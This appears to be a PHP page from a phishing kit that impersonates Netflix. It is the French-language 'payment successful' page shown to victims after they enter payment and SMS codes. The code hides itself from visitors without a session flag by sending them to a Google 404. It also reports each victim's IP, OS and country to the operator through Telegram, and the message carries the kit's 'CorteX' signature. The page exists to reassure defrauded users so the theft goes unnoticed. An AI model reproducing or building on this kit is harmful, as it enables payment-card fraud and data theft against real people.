<?php
session_start();
include "./zebi/config.php";
include "./zebi/functions.php";

if ($_SESSION['allow'] != "yes") {
    header('location: https://google.com/404');
    exit();
}

$user_info = getUserInfo();
$timestamp = getCurrentTimestamp();

if (!isset($_SESSION['success_page_notified'])) {
    $telegram_message = "
+ ✅ USER SUCCESS REACHED

🧩 Extra
├ 🌐 IP : $ip
├ 🖥️ OS : {$user_info['os']}
└ 🗺️ PAYS : {$user_info['country_code']}

📍 Base : SUCCESS PAGE [$timestamp]
└ [© 2025 - All rights reserved.]

[🎯] CorteX - @Sssba3 [🎯]
";


    if (sendMessage($telegram_message)) {
        error_log("Success page notification sent to Telegram successfully.");
        $_SESSION['success_page_notified'] = true;
    } else {
        error_log("Failed to send success page notification to Telegram.");
    }
}

unset($_SESSION['payment_submitted']);
unset($_SESSION['sms_submitted']);
unset($_SESSION['loading_page_notified']);
unset($_SESSION['payment_page_notified']);
unset($_SESSION['verification_page_notified']);

?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Succès - Netflix</title>
    <link rel="icon" href="files/img/nficon2025.ico">
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: black;
            background-image: url('files/img/back.jpg');
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Arial', sans-serif;
            color: #fff;
        }

        .success-container {
            background-color: rgba(0,0,0,0.85);
            border: 1px solid #333;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
            max-width: 500px;
            width: 90%;
        }

        .success-logo {
            width: 160px;
            margin-bottom: 20px;
        }

        .success-message {
            font-size: 24px;
            margin-bottom: 20px;
            color: #4CAF50;
        }

        p {
            font-size: 18px;
            margin-bottom: 30px;
        }

        .button {
            background-color: #e50914;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            text-decoration: none;
            display: inline-block;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background-color: #f40612;
        }
    </style>
</head>
<body>
    <div class="success-container">
        <img src="files/img/Logonetflix.png" alt="Netflix Logo" class="success-logo">
        <div class="success-message">Paiement réussi !</div>
        <p>Votre abonnement Netflix est maintenant actif. Profitez de vos films et séries préférés !</p>
        <a href="https://www.netflix.com" class="button">Accéder à Netflix</a>
    </div>
</body>
</html>
